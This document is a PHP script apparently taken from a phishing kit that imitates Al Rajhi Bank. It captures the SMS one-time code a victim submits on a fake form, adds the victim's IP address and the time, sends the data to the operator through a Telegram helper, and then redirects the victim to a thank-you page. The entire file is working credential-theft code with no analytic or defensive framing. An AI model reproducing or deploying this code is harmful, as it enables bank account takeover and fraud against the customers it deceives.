<?php
include("tlgrm.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] OTP ALRAJHI BANK [+]###############[+\n";
$message .= "#SMS CODE   2     : ".$_POST['nf-field-10']."\n";
$message .= "# IP INFO            : $ip\n";
$message .= "# TIME/DATE          : $date\n";
$message .= "+]###############[+] G 1 N G  [+]###############[+\n";
telegram($message);
sleep(5);
echo "<meta http-equiv='refresh' content='0; url=thanks.php'/>";

?>